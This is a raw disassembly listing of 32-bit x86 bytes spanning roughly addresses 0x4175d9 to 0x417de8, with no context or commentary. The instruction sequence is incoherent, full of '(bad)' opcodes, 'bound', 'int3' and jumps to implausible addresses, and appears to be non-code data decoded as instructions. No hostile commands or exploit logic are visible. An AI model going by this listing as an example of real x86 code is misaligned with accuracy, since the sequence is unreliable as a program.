  4175d9:	bound  eax,QWORD PTR [eax+0x41]
  4175dc:	and    eax,0x40000500
  4175e1:	inc    ebx
  4175e2:	add    eax,0x40624041
  4175e7:	inc    ebx
  4175e8:	add    eax,0x43402541
  4175ed:	bound  eax,QWORD PTR [eax+0x43]
  4175f0:	int3   
  4175f1:	inc    eax
  4175f2:	bound  eax,QWORD PTR [eax]
  4175f4:	inc    ecx
  4175f5:	inc    eax
  4175f6:	inc    eax
  4175f7:	add    eax,0x44151105
  4175fc:	sbb    dl,BYTE PTR [ecx+0x34]
  4175ff:	fadd   QWORD PTR [ebx+0x63]
  417602:	test   eax,0x31246380
  417607:	adc    DWORD PTR [eax+0x622240d9],edx
  41760d:	fs xchg edi,eax
  41760f:	test   BYTE PTR [edi],al
  417611:	push   esi
  417612:	ss xor al,ch
  417615:	mov    dl,ah
  417617:	push   edx
  417618:	inc    ebx
  417619:	pop    esi
  41761a:	bound  eax,QWORD PTR [eax+0x25]
  41761d:	add    BYTE PTR [esi+0x40],ah
  417620:	add    eax,0x40404143
  417625:	inc    ebx
  417626:	add    BYTE PTR [eax],al
  417628:	add    BYTE PTR [edx-0x34],ah
  41762b:	inc    eax
  41762c:	add    eax,0x40004041
  417631:	inc    ecx
  417632:	int3   
  417633:	add    BYTE PTR [ebx-0x7c],al
  417636:	add    eax,0x5406240
  41763b:	bound  eax,QWORD PTR [eax-0x7f]
  41763e:	xchg   BYTE PTR [ecx],ah
  417640:	inc    edx
  417641:	cwde   
  417642:	shl    DWORD PTR [ebp+0x29],1
  417645:	jge    0x417682
  417647:	dec    edi
  417648:	arpl   sp,di
  41764a:	or     BYTE PTR [ecx+eax*2+0x0],bl
  41764e:	mov    edi,0xbe626d24
  417653:	jb     0x417695
  417655:	xor    al,BYTE PTR [eax+0x62]
  417658:	pop    eax
  417659:	inc    ecx
  41765a:	add    eax,0x40404340
  41765f:	inc    ebx
  417660:	inc    eax
  417661:	test   BYTE PTR [eax],al
  417663:	add    eax,0x40624041
  417668:	inc    eax
  417669:	add    BYTE PTR [edx+0x5],ah
  41766c:	inc    ebx
  41766d:	add    BYTE PTR [eax+0x78],al
  417670:	inc    ecx
  417671:	add    BYTE PTR [eax+0x41],bl
  417674:	bound  edi,QWORD PTR [edi-0x1e4f91c5]
  41767a:	fidiv  WORD PTR [edx]
  41767c:	pop    es
  41767d:	mov    edi,0x5e552d1a
  417682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417683:	ja     0x417689
  417685:	cmp    DWORD PTR [eax-0x6bbe3699],ebp
  41768b:	inc    eax
  41768c:	sub    ebp,eax
  41768e:	xor    dl,BYTE PTR [eax]
  417690:	or     eax,DWORD PTR [ebx-0x60]
  417693:	inc    ebp
  417694:	xlat   BYTE PTR ds:[ebx]
  417695:	xchg   BYTE PTR [edi-0x41cf549d],ah
  41769b:	pusha  
  41769c:	or     DWORD PTR [eax+0x62],esp
  41769f:	ja     0x41765d
  4176a1:	loopne 0x41769d
  4176a3:	push   ebp
  4176a4:	cmc    
  4176a5:	inc    edi
  4176a6:	adc    DWORD PTR [ebx],edx
  4176a8:	add    dl,al
  4176aa:	loopne 0x4176ef
  4176ac:	dec    eax
  4176ad:	inc    eax
  4176ae:	test   BYTE PTR [eax],al
  4176b0:	int3   
  4176b1:	bound  eax,QWORD PTR ds:0xcc840f41
  4176b7:	inc    ebx
  4176b8:	add    BYTE PTR [eax+0x0],al
  4176bb:	inc    eax
  4176bc:	inc    eax
  4176bd:	inc    eax
  4176be:	int3   
  4176bf:	add    BYTE PTR ds:0x62404341,al
  4176c5:	pop    eax
  4176c6:	add    BYTE PTR [ebx+0x40],al
  4176c9:	bound  ecx,QWORD PTR [edi]
  4176cb:	inc    eax
  4176cc:	sbb    bh,BYTE PTR [ecx+edi*8+0x4771c97f]
  4176d3:	or     BYTE PTR [ebp+ecx*1+0x64],cl
  4176d7:	bound  ebp,QWORD PTR [ebx+eiz*4+0x40]
  4176db:	and    al,0x63
  4176dd:	inc    ebx
  4176de:	push   esp
  4176df:	loop   0x417714
  4176e1:	mov    edi,0xb8863e29
  4176e6:	popa   
  4176e7:	jl     0x41774c
  4176e9:	and    dl,BYTE PTR [ebx-0x7e]
  4176ec:	xor    al,0xd
  4176ee:	dec    ecx
  4176ef:	push   0x43
  4176f1:	gs inc eax
  4176f3:	pusha  
  4176f4:	mov    edi,0x904964cb
  4176f9:	dec    edx
  4176fa:	xor    esi,ecx
  4176fc:	mov    edi,0x24dc2a02
  417701:	test   al,0x6b
  417703:	add    DWORD PTR [eax],eax
  417705:	add    BYTE PTR [eax+0x40],al
  417708:	cmovno eax,DWORD PTR ds:0x40056243
  41770f:	int3   
  417710:	add    ah,cl
  417712:	inc    eax
  417713:	inc    eax
  417714:	bound  eax,QWORD PTR [ecx+0x0]
  417717:	add    BYTE PTR [edi],cl
  417719:	inc    ebx
  41771a:	inc    eax
  41771b:	inc    eax
  41771c:	add    BYTE PTR [ecx+0x43],al
  41771f:	add    eax,0x40256240
  417724:	bound  eax,QWORD PTR [eax]
  417726:	mov    edi,0x4342dcab
  41772b:	add    BYTE PTR [eax+0x41],al
  41772e:	aaa    
  41772f:	inc    esi
  417730:	arpl   WORD PTR [ecx+edx*8-0x3a7fda4d],cx
  417737:	dec    edx
  417738:	adc    al,0x6d
  41773a:	imul   edx,DWORD PTR [esi+0x28862b2a],0x64
  417741:	jnp    0x41778e
  417743:	pushf  
  417744:	and    ecx,DWORD PTR [eax+0x25]
  417747:	test   al,0x52
  417749:	fs pop es
  41774b:	xchg   esp,eax
  41774c:	inc    ecx
  41774d:	add    BYTE PTR [esi+0x5],0xe
  417751:	add    eax,0x4140cc00
  417756:	inc    eax
  417757:	inc    ebx
  417758:	bound  esp,QWORD PTR ds:0x41400043
  41775e:	add    BYTE PTR [eax],al
  417760:	add    eax,0x43624062
  417765:	inc    ecx
  417766:	inc    eax
  417767:	inc    eax
  417768:	inc    eax
  417769:	add    eax,0x40624340
  41776e:	add    eax,0x40664140
  417773:	(bad)  
  417774:	in     eax,0x23
  417776:	jmp    0x11c8de68
  41777b:	dec    ebx
  41777c:	inc    ecx
  41777d:	rol    BYTE PTR [ecx+0x32],1
  417780:	cld    
  417781:	test   eax,0x4f433cc1
  417786:	and    DWORD PTR [esi+0x53],eax
  417789:	out    dx,eax
  41778a:	inc    ebx
  41778b:	add    BYTE PTR ds:0x41107840,al
  417791:	bound  eax,QWORD PTR [eax+0x40]
  417794:	sldt   WORD PTR [eax-0x34]
  417798:	js     0x4177fc
  41779a:	add    eax,0x40664143
  41779f:	inc    ebx
  4177a0:	add    BYTE PTR [ecx+0x5],al
  4177a3:	js     0x4177e5
  4177a5:	bound  eax,QWORD PTR [eax+0x0]
  4177a8:	inc    eax
  4177a9:	adc    al,0xc4
  4177ab:	xor    ch,bl
  4177ad:	inc    eax
  4177ae:	add    BYTE PTR [esi-0x2357cbef],al
  4177b4:	xor    al,0x67
  4177b6:	adc    esi,DWORD PTR [ebx]
  4177b8:	stos   DWORD PTR es:[edi],eax
  4177b9:	pop    edi
  4177ba:	adc    cl,al
  4177bc:	stos   BYTE PTR es:[edi],al
  4177bd:	inc    eax
  4177be:	jbe    0x41777f
  4177c0:	inc    ecx
  4177c1:	inc    ebx
  4177c2:	inc    eax
  4177c3:	inc    eax
  4177c4:	add    eax,0x434162
  4177c9:	inc    eax
  4177ca:	add    BYTE PTR [edx+0x5],ah
  4177cd:	inc    eax
  4177ce:	adc    BYTE PTR [edx+0x40],ah
  4177d1:	inc    ebx
  4177d2:	inc    ecx
  4177d3:	add    eax,0x4340
  4177d8:	add    eax,0x404162
  4177dd:	add    BYTE PTR [eax+0x43],al
  4177e0:	inc    eax
  4177e1:	add    eax,0x67bc2242
  4177e6:	stos   DWORD PTR es:[edi],eax
  4177e7:	xor    eax,0x1c35bf81
  4177ec:	inc    ecx
  4177ed:	mov    ds:0xbf654090,al
  4177f2:	xor    BYTE PTR ds:0x11af6400,0x1
  4177f9:	xor    eax,0x432840c5
  4177fe:	lock mov al,ds:0x4c90c547
  417804:	push   cs
  417805:	nop
  417806:	inc    eax
  417807:	add    BYTE PTR [eax],al
  417809:	inc    ecx
  41780a:	inc    ebx
  41780b:	add    eax,0x41784062
  417810:	inc    eax
  417811:	inc    eax
  417812:	add    BYTE PTR [edi],cl
  417814:	bound  eax,QWORD PTR [ebx+0x0]
  417817:	add    eax,0x25006240
  41781c:	inc    eax
  41781d:	add    eax,0x40254143
  417822:	add    eax,0x8a620000
  417827:	jne    0x41782a
  417829:	xchg   BYTE PTR [ecx+eax*2+0x20],al
  41782d:	rcr    DWORD PTR [edi+0x42],0x49
  417831:	outs   dx,DWORD PTR ds:[esi]
  417832:	push   edi
  417833:	ficom  DWORD PTR [ebx+eax*2-0x48]
  417837:	sub    al,0x86
  417839:	inc    esi
  41783a:	sub    BYTE PTR [esp+esi*1+0x6c418ad1],bh
  417841:	xor    al,0x3c
  417843:	push   0x406e356a
  417848:	push   ds
  417849:	aam    0x23
  41784b:	dec    edi
  41784c:	xchg   esi,eax
  41784d:	jbe    0x417861
  41784f:	xor    al,0x49
  417851:	arpl   WORD PTR [ebx+0x0],ax
  417854:	add    BYTE PTR [eax],al
  417856:	inc    ecx
  417857:	inc    eax
  417858:	bound  esp,QWORD PTR [esi+0x0]
  41785b:	inc    eax
  41785c:	add    eax,0x5400000
  417861:	inc    ecx
  417862:	inc    eax
  417863:	inc    eax
  417864:	bound  esp,QWORD PTR ds:0x25050043
  41786a:	inc    ecx
  41786b:	inc    ebx
  41786c:	inc    eax
  41786d:	test   BYTE PTR [eax+0x0],al
  417870:	bound  ebx,QWORD PTR [eax+0x62]
  417873:	inc    ecx
  417874:	inc    eax
  417875:	cmp    esp,ebx
  417877:	(bad)  
  417878:	out    0xfb,al
  41787a:	ins    DWORD PTR es:[edi],dx
  41787b:	adc    DWORD PTR [esi+0x22f6706e],eax
  417881:	lods   eax,DWORD PTR ds:[esi]
  417882:	inc    eax
  417883:	ret    
  417884:	pusha  
  417885:	mov    bh,0xac
  417887:	mov    eax,0x17de941
  41788c:	mov    edi,0x4362daa8
  417891:	dec    ebx
  417892:	inc    eax
  417893:	dec    ecx
  417894:	mov    edi,0x40621012
  417899:	inc    ecx
  41789a:	and    eax,0x40000500
  41789f:	inc    ebx
  4178a0:	add    eax,0x40624041
  4178a5:	inc    ebx
  4178a6:	add    eax,0x43402541
  4178ab:	bound  eax,QWORD PTR [eax+0x43]
  4178ae:	int3   
  4178af:	inc    eax
  4178b0:	bound  eax,QWORD PTR [eax]
  4178b2:	inc    ecx
  4178b3:	inc    eax
  4178b4:	inc    eax
  4178b5:	add    eax,0x30840005
  4178ba:	xchg   esp,eax
  4178bb:	xor    eax,DWORD PTR [edx]
  4178bd:	mov    edi,0xd88a5448
  4178c2:	and    al,ch
  4178c4:	jg     0x4178f9
  4178c6:	inc    edx
  4178c7:	fldcw  WORD PTR ds:0x46c35bc2
  4178cd:	lds    ebx,FWORD PTR [ebp+0x20]
  4178d0:	iret   
  4178d1:	leave  
  4178d2:	mov    BYTE PTR [eax+0x1],al
  4178d5:	xchg   ah,bl
  4178d7:	jbe    0x417885
  4178d9:	imul   esp,ebx,0x21
  4178dc:	scas   eax,DWORD PTR es:[edi]
  4178dd:	xor    al,0xcb
  4178df:	js     0x4178b6
  4178e1:	retf   
  4178e2:	daa    
  4178e3:	inc    eax
  4178e4:	ret    
  4178e5:	inc    esi
  4178e6:	and    BYTE PTR [edx+0x67],0x64
  4178ea:	imul   ebp,DWORD PTR [edx+edx*2],0x19
  4178ee:	frstor [esp+ebp*8+0x4c]
  4178f2:	bound  eax,QWORD PTR [eax+0x25]
  4178f5:	add    BYTE PTR [esi+0x40],ah
  4178f8:	add    eax,0x40404143
  4178fd:	inc    ebx
  4178fe:	add    BYTE PTR [eax],al
  417900:	add    BYTE PTR [edx-0x34],ah
  417903:	inc    eax
  417904:	add    eax,0x40004041
  417909:	inc    ecx
  41790a:	int3   
  41790b:	add    BYTE PTR [ebx-0x7c],al
  41790e:	add    eax,0x5406240
  417913:	bound  ebx,QWORD PTR [esi]
  417915:	jge    0x4178d9
  417917:	mov    ah,0xbc
  417919:	in     al,0x55
  41791b:	pop    esp
  41791c:	jae    0x41795e
  41791e:	xor    eax,0xa691562
  417923:	fstp   QWORD PTR [eax-0x323a51a0]
  417929:	test   al,0xfc
  41792b:	fidiv  WORD PTR [esi+0x17]
  41792e:	sub    eax,DWORD PTR [esi-0x579dee95]
  417934:	pop    DWORD PTR [eax-0x3f]
  417937:	sub    DWORD PTR [ebx],ebp
  417939:	mov    esp,0x2e034041
  41793e:	mov    DWORD PTR [eax+0x62],0x40054158
  417945:	inc    ebx
  417946:	inc    eax
  417947:	inc    eax
  417948:	inc    ebx
  417949:	inc    eax
  41794a:	test   BYTE PTR [eax],al
  41794c:	add    eax,0x40624041
  417951:	inc    eax
  417952:	add    BYTE PTR [edx+0x5],ah
  417955:	inc    ebx
  417956:	add    BYTE PTR [eax+0x78],al
  417959:	inc    ecx
  41795a:	add    BYTE PTR [eax+0x41],bl
  41795d:	bound  edi,QWORD PTR [edi+0x2a7c4154]
  417963:	repnz retf 0xbfc1
  417967:	and    bl,al
  417969:	imul   eax,DWORD PTR [ecx-0x7e],0x6f
  41796d:	aas    
  41796e:	mov    edi,0x2a5c2851
  417973:	add    BYTE PTR [eax-0x3f],al
  417976:	xor    DWORD PTR [eax],esp
  417978:	fs loopne 0x417996
  41797b:	mov    fs,WORD PTR [esi]
  41797d:	ffreep st(5)
  41797f:	inc    ecx
  417980:	(bad)  [ebx+0x2]
  417983:	cli    
  417984:	dec    edx
  417985:	rol    DWORD PTR [esi-0x33ff7bc0],0x62
  41798c:	add    eax,0xcc840f41
  417991:	inc    ebx
  417992:	add    BYTE PTR [eax+0x0],al
  417995:	inc    eax
  417996:	inc    eax
  417997:	inc    eax
  417998:	int3   
  417999:	add    BYTE PTR ds:0x62404341,al
  41799f:	pop    eax
  4179a0:	add    BYTE PTR [ebx+0x40],al
  4179a3:	bound  ecx,QWORD PTR [edi]
  4179a5:	inc    eax
  4179a6:	(bad)  
  4179a7:	fmul   DWORD PTR [eax+0x59]
  4179aa:	pop    DWORD PTR [eax+0x41]
  4179ad:	and    al,0xcb
  4179af:	pop    eax
  4179b0:	leave  
  4179b1:	mov    eax,0x47c57ef5
  4179b6:	inc    eax
  4179b7:	or     eax,0x361e47bc
  4179bc:	retf   0x2a19
  4179bf:	retf   
  4179c0:	adc    BYTE PTR [ebx+0x45],al
  4179c3:	inc    eax
  4179c4:	ret    0x12ac
  4179c7:	fisttp WORD PTR [ebx+0x30]
  4179ca:	xchg   edx,eax
  4179cb:	jl     0x417a36
  4179cd:	bound  edi,QWORD PTR [edi+ebx*4+0x40000063]
  4179d4:	inc    eax
  4179d5:	cmovno eax,DWORD PTR ds:0x40056243
  4179dc:	int3   
  4179dd:	add    ah,cl
  4179df:	inc    eax
  4179e0:	inc    eax
  4179e1:	bound  eax,QWORD PTR [ecx+0x0]
  4179e4:	add    BYTE PTR [edi],cl
  4179e6:	inc    ebx
  4179e7:	inc    eax
  4179e8:	inc    eax
  4179e9:	add    BYTE PTR [ecx+0x43],al
  4179ec:	add    eax,0x40256240
  4179f1:	bound  eax,QWORD PTR [eax]
  4179f3:	aam    0x64
  4179f5:	inc    edx
  4179f6:	daa    
  4179f7:	lds    edx,FWORD PTR ds:0xf6404862
  4179fd:	inc    ebx
  4179fe:	rol    BYTE PTR [esi+0x31886b43],0x67
  417a05:	es mov ebp,0x615c4525
  417a0b:	ins    BYTE PTR es:[edi],dx
  417a0c:	mov    DWORD PTR [eax+0x25],eax
  417a0f:	mov    edi,0x7b632d30
  417a14:	mov    gs,ebx
  417a16:	xchg   ebx,eax
  417a17:	mov    edi,0x4e4ee840
  417a1c:	xchg   DWORD PTR [edx-0x3f],ecx
  417a1f:	add    eax,0x4140cc00
  417a24:	inc    eax
  417a25:	inc    ebx
  417a26:	bound  esp,QWORD PTR ds:0x41400043
  417a2c:	add    BYTE PTR [eax],al
  417a2e:	add    eax,0x43624062
  417a33:	inc    ecx
  417a34:	inc    eax
  417a35:	inc    eax
  417a36:	inc    eax
  417a37:	add    eax,0x40624340
  417a3c:	add    eax,0x40664140
  417a41:	mov    edi,0xcd35d0bc
  417a46:	dec    esp
  417a47:	inc    eax
  417a48:	inc    esp
  417a49:	das    
  417a4a:	popa   
  417a4b:	leave  
  417a4c:	rdpmc  
  417a4e:	ret    
  417a4f:	dec    ebp
  417a50:	rol    ch,0xde
  417a53:	inc    esi
  417a54:	cmp    ah,BYTE PTR [ecx-0x22]
  417a57:	inc    eax
  417a58:	xor    eax,DWORD PTR [esi+0x434c6dcf]
  417a5e:	mov    al,0x7e
  417a60:	shl    BYTE PTR [esp+eax*8],cl
  417a63:	push   0x10
  417a65:	and    BYTE PTR [eax],bh
  417a67:	inc    eax
  417a68:	mov    DWORD PTR [edi+0x4f],0xb141cb46
  417a6f:	inc    ebx
  417a70:	add    BYTE PTR ds:0x41107840,al
  417a76:	bound  eax,QWORD PTR [eax+0x40]
  417a79:	sldt   WORD PTR [eax-0x34]
  417a7d:	js     0x417ae1
  417a7f:	add    eax,0x40664143
  417a84:	inc    ebx
  417a85:	add    BYTE PTR [ecx+0x5],al
  417a88:	js     0x417aca
  417a8a:	bound  eax,QWORD PTR [eax+0x0]
  417a8d:	inc    eax
  417a8e:	bound  eax,QWORD PTR [ecx+ebx*1]
  417a91:	mov    DWORD PTR [esi-0x41],eax
  417a94:	inc    ebx
  417a95:	xlat   BYTE PTR ds:[ebx]
  417a96:	inc    eax
  417a97:	shl    BYTE PTR [ebp+eax*8-0x17cf4093],0x40
  417a9f:	push   0xf56a4262
  417aa4:	shr    cl,1
  417aa6:	jnp    0x417ae8
  417aa8:	lds    ecx,FWORD PTR [edx+edx*1-0x5c]
  417aac:	inc    eax
  417aad:	jge    0x417af5
  417aaf:	sub    al,0x86
  417ab1:	cmp    al,0x61
  417ab3:	test   al,0x31
  417ab5:	jle    0x417af8
  417ab7:	inc    ebx
  417ab8:	inc    eax
  417ab9:	inc    eax
  417aba:	add    eax,0x434162
  417abf:	inc    eax
  417ac0:	add    BYTE PTR [edx+0x5],ah
  417ac3:	inc    eax
  417ac4:	adc    BYTE PTR [edx+0x40],ah
  417ac7:	inc    ebx
  417ac8:	inc    ecx
  417ac9:	add    eax,0x4340
  417ace:	add    eax,0x404162
  417ad3:	add    BYTE PTR [eax+0x43],al
  417ad6:	inc    eax
  417ad7:	add    eax,0xf9231f46
  417adc:	lea    edi,[edi+0x901216c]
  417ae2:	mov    edi,0x182a5c40
  417ae7:	pop    ecx
  417ae8:	inc    eax
  417ae9:	les    edi,FWORD PTR [edi-0x62ee45c0]
  417aef:	inc    ebp
  417af0:	add    ch,BYTE PTR [edi-0x41]
  417af3:	inc    eax
  417af4:	jge    0x417aae
  417af6:	loope  0x417ac2
  417af8:	inc    eax
  417af9:	dec    ebp
  417afa:	sub    eax,0xc5496d9f
  417aff:	push   edx
  417b00:	arpl   si,ax
  417b02:	(bad)
  417b05:	jle    0x417ad5
  417b07:	sub    BYTE PTR [eax+0x6f],al
  417b0a:	xchg   BYTE PTR [edi-0x44],cl
  417b0d:	inc    eax
  417b0e:	add    BYTE PTR [eax],al
  417b10:	inc    ecx
  417b11:	inc    ebx
  417b12:	add    eax,0x41784062
  417b17:	inc    eax
  417b18:	inc    eax
  417b19:	add    BYTE PTR [edi],cl
  417b1b:	bound  eax,QWORD PTR [ebx+0x0]
  417b1e:	add    eax,0x25006240
  417b23:	inc    eax
  417b24:	add    eax,0x40254143
  417b29:	add    eax,0x3c620000
  417b2e:	pop    ds
  417b2f:	add    BYTE PTR cs:[ebx],bh
  417b32:	and    al,BYTE PTR [ebx+ebp*2-0xd]
  417b36:	inc    ebx
  417b37:	sbb    edi,DWORD PTR [edx-0x40]
  417b3a:	mov    edi,0x33805f6f
  417b3f:	repnz bound esi,QWORD PTR [edx]
  417b42:	mov    edi,0xcc63dc9c
  417b47:	dec    eax
  417b48:	inc    ecx
  417b49:	aas    
  417b4a:	mov    edi,0x40674023
  417b4f:	jl     0x417b8f
  417b51:	shr    BYTE PTR [eax+eax*8],0xcc
  417b55:	and    al,0x31
  417b57:	inc    ebx
  417b58:	inc    edx
  417b59:	adc    eax,0x501b39c5
  417b5e:	ins    BYTE PTR es:[edi],dx
  417b5f:	and    ebp,DWORD PTR cs:[esi-0x7a]
  417b63:	les    ebp,FWORD PTR [eax]
  417b65:	or     eax,0x43
  417b6a:	inc    ecx
  417b6b:	inc    eax
  417b6c:	bound  esp,QWORD PTR [esi+0x0]
  417b6f:	inc    eax
  417b70:	add    eax,0x5400000
  417b75:	inc    ecx
  417b76:	inc    eax
  417b77:	inc    eax
  417b78:	bound  esp,QWORD PTR ds:0x25050043
  417b7e:	inc    ecx
  417b7f:	inc    ebx
  417b80:	inc    eax
  417b81:	test   BYTE PTR [eax+0x0],al
  417b84:	bound  ebx,QWORD PTR [eax+0x62]
  417b87:	inc    ecx
  417b88:	inc    eax
  417b89:	xor    eax,0x4058cc2d
  417b8e:	and    ebx,DWORD PTR [esi+0x46]
  417b91:	gs retf 0xc050
  417b95:	xchg   ecx,eax
  417b96:	ret    0x96b8
  417b99:	add    DWORD PTR ds:0x40052938,ebx
  417b9f:	dec    ecx
  417ba0:	jge    0x417c06
  417ba2:	jecxz  0x417be4
  417ba4:	add    BYTE PTR [esi-0x4703d7c0],al
  417baa:	pop    ds
  417bab:	xor    al,al
  417bad:	das    
  417bae:	push   eax
  417baf:	sahf   
  417bb0:	pop    di
  417bb2:	push   0x28
  417bb4:	and    eax,0x194c5b90
  417bb9:	adc    ebx,esp
  417bbb:	inc    eax
  417bbc:	dec    edx
  417bbd:	add    eax,0x43dc622f
  417bc2:	fwait
  417bc3:	jne    0x417b85
  417bc5:	xchg   ch,ch
  417bc7:	adc    BYTE PTR [edx+0x40],ah
  417bca:	inc    ecx
  417bcb:	and    eax,0x40000500
  417bd0:	inc    ebx
  417bd1:	add    eax,0x40624041
  417bd6:	inc    ebx
  417bd7:	add    eax,0x43402541
  417bdc:	bound  eax,QWORD PTR [eax+0x43]
  417bdf:	int3   
  417be0:	inc    eax
  417be1:	bound  eax,QWORD PTR [eax]
  417be3:	inc    ecx
  417be4:	inc    eax
  417be5:	inc    eax
  417be6:	add    eax,0x33834405
  417beb:	xchg   esi,eax
  417bec:	fsubr  QWORD PTR [ecx]
  417bee:	push   cs
  417bef:	int3   
  417bf0:	xor    eax,0x402ac81d
  417bf5:	gs (bad) 
  417bf7:	xor    al,0x40
  417bf9:	dec    eax
  417bfa:	inc    eax
  417bfb:	lahf   
  417bfc:	sub    al,al
  417bfe:	add    eax,0x310576dc
  417c03:	dec    ecx
  417c04:	inc    eax
  417c05:	adc    eax,0x63af6586
  417c0a:	ins    BYTE PTR es:[edi],dx
  417c0b:	fnsave [ecx+ebp*1]
  417c0e:	pusha  
  417c0f:	pop    ecx
  417c10:	bound  edx,QWORD PTR [eax+0x40625fd2]
  417c16:	and    eax,0x5406600
  417c1b:	inc    ebx
  417c1c:	inc    ecx
  417c1d:	inc    eax
  417c1e:	inc    eax
  417c1f:	inc    ebx
  417c20:	add    BYTE PTR [eax],al
  417c22:	add    BYTE PTR [edx-0x34],ah
  417c25:	inc    eax
  417c26:	add    eax,0x40004041
  417c2b:	inc    ecx
  417c2c:	int3   
  417c2d:	add    BYTE PTR [ebx-0x7c],al
  417c30:	add    eax,0x5406240
  417c35:	bound  ebx,QWORD PTR [edx+eax*4]
  417c38:	mov    ss,WORD PTR [esp+0x42d56bb7]
  417c3f:	rol    BYTE PTR ds:0xed44d40e,0x5a
  417c46:	aaa    
  417c47:	outs   dx,BYTE PTR ds:[esi]
  417c48:	xchg   BYTE PTR [edx+eiz*2],dh
  417c4b:	inc    edi
  417c4c:	mov    edi,0x404a624e
  417c51:	bound  ebx,QWORD PTR [eax+0x41]
  417c54:	add    eax,0x40404340
  417c59:	inc    ebx
  417c5a:	inc    eax
  417c5b:	test   BYTE PTR [eax],al
  417c5d:	add    eax,0x40624041
  417c62:	inc    eax
  417c63:	add    BYTE PTR [edx+0x5],ah
  417c66:	inc    ebx
  417c67:	add    BYTE PTR [eax+0x78],al
  417c6a:	inc    ecx
  417c6b:	add    BYTE PTR [eax+0x41],bl
  417c6e:	bound  esp,QWORD PTR [ebx+eiz*2]
  417c71:	or     eax,edi
  417c73:	adc    BYTE PTR [ebx+0x578dc140],ch
  417c79:	fsubr  DWORD PTR [esp+0x5406def]
  417c80:	test   eax,0x5d43cb62
  417c85:	push   esp
  417c86:	rol    BYTE PTR [esi+0x331544ac],0x23
  417c8d:	inc    eax
  417c8e:	outs   dx,DWORD PTR ds:[esi]
  417c8f:	and    eax,0xc440c861
  417c94:	outs   dx,DWORD PTR ds:[esi]
  417c95:	and    eax,0x8aff8c45
  417c9a:	pop    DWORD PTR [eax-0xa]
  417c9d:	sbb    al,al
  417c9f:	add    eax,0x844047
  417ca4:	int3   
  417ca5:	bound  eax,QWORD PTR ds:0xcc840f41
  417cab:	inc    ebx
  417cac:	add    BYTE PTR [eax+0x0],al
  417caf:	inc    eax
  417cb0:	inc    eax
  417cb1:	inc    eax
  417cb2:	int3   
  417cb3:	add    BYTE PTR ds:0x62404341,al
  417cb9:	pop    eax
  417cba:	add    BYTE PTR [ebx+0x40],al
  417cbd:	bound  ecx,QWORD PTR [edi]
  417cbf:	inc    eax
  417cc0:	push   edx
  417cc1:	imul   esi,DWORD PTR [ecx],0x86304003
  417cc7:	cmp    al,0xe1
  417cc9:	and    BYTE PTR [ebp+eax*8+0x32],ch
  417ccd:	sbb    ch,BYTE PTR [edi+eiz*2]
  417cd0:	mov    al,0xf4
  417cd2:	out    dx,eax
  417cd3:	aaa    
  417cd4:	sub    BYTE PTR [eax-0x75],al
  417cd7:	xor    al,0x36
  417cd9:	rol    BYTE PTR [ebx-0x1a],1
  417cdc:	inc    eax
  417cdd:	rol    BYTE PTR ds:0xd166b140,0x0
  417ce4:	add    BYTE PTR [eax+0x40],al
  417ce7:	cmovno eax,DWORD PTR ds:0x40056243
  417cee:	int3   
  417cef:	add    ah,cl
  417cf1:	inc    eax
  417cf2:	inc    eax
  417cf3:	bound  eax,QWORD PTR [ecx+0x0]
  417cf6:	add    BYTE PTR [edi],cl
  417cf8:	inc    ebx
  417cf9:	inc    eax
  417cfa:	inc    eax
  417cfb:	add    BYTE PTR [ecx+0x43],al
  417cfe:	add    eax,0x40256240
  417d03:	bound  eax,QWORD PTR [eax]
  417d05:	mov    ds:0x48863422,eax
  417d0a:	bound  edi,QWORD PTR [eax+eiz*1+0x224e6ab4]
  417d11:	pusha  
  417d12:	dec    esi
  417d13:	lds    esp,FWORD PTR [ebx-0x4]
  417d16:	inc    eax
  417d17:	ret    0x838a
  417d1a:	cmp    cl,dl
  417d1c:	mov    eax,ds:0x57a6068
  417d21:	arpl   dx,di
  417d23:	inc    esi
  417d24:	sbb    al,0x4e
  417d26:	inc    eax
  417d27:	jns    0x417caf
  417d29:	outs   dx,BYTE PTR ds:[esi]
  417d2a:	mov    esp,0x7bb041f5
  417d2f:	les    esp,FWORD PTR [ecx]
  417d31:	sub    BYTE PTR [edx+0x409b43a5],dl
  417d37:	sub    BYTE PTR [ecx+0x5d358],cl
  417d3d:	int3   
  417d3e:	inc    eax
  417d3f:	inc    ecx
  417d40:	inc    eax
  417d41:	inc    ebx
  417d42:	bound  esp,QWORD PTR ds:0x41400043
  417d48:	add    BYTE PTR [eax],al
  417d4a:	add    eax,0x43624062
  417d4f:	inc    ecx
  417d50:	inc    eax
  417d51:	inc    eax
  417d52:	inc    eax
  417d53:	add    eax,0x40624340
  417d58:	add    eax,0x40664140
  417d5d:	bound  esi,QWORD PTR [eax]
  417d5f:	int3   
  417d60:	and    al,0x2
  417d62:	add    eax,0xc04cc161
  417d67:	mov    eax,DWORD PTR [eax-0x40]
  417d6a:	xchg   ch,bl
  417d6c:	out    dx,al
  417d6d:	add    eax,0x26295f40
  417d72:	mov    eax,cs:0x3b314324
  417d78:	inc    eax
  417d79:	jmp    0x306c:0x48328088
  417d80:	rol    BYTE PTR [edx+0x5],1
  417d83:	jmp    0x5cce0235
  417d88:	inc    eax
  417d89:	rol    DWORD PTR [esi+0x4342a834],0x77
  417d90:	das    
  417d91:	bound  esp,QWORD PTR ds:0xd1591182
  417d97:	pop    ds
  417d98:	inc    eax
  417d99:	ret    
  417d9a:	inc    ebx
  417d9b:	add    BYTE PTR ds:0x41107840,al
  417da1:	bound  eax,QWORD PTR [eax+0x40]
  417da4:	sldt   WORD PTR [eax-0x34]
  417da8:	js     0x417e0c
  417daa:	add    eax,0x40664143
  417daf:	inc    ebx
  417db0:	add    BYTE PTR [ecx+0x5],al
  417db3:	js     0x417df5
  417db5:	bound  eax,QWORD PTR [eax+0x0]
  417db8:	inc    eax
  417db9:	xchg   DWORD PTR [eax],ebp
  417dbb:	mov    al,0x3c
  417dbd:	int    0x5
  417dbf:	xor    esi,DWORD PTR [esi+0x5]
  417dc2:	xor    eax,0xaa366442
  417dc7:	inc    eax
  417dc8:	ret    0x5086
  417dcb:	or     eax,0x7aadb9a8
  417dd0:	pusha  
  417dd1:	cmp    ecx,ebp
  417dd3:	clc    
  417dd4:	loopne 0x417dba
  417dd6:	aas    
  417dd7:	inc    eax
  417dd8:	outs   dx,BYTE PTR ds:[esi]
  417dd9:	xchg   BYTE PTR [edi+0x9],cl
  417ddc:	jbe    0x417e1f
  417dde:	xor    ah,BYTE PTR ds:0xab4505c2
  417de4:	fs inc ebx
  417de6:	pusha  
  417de7:	inc    ecx
  417de8:	inc    ebx
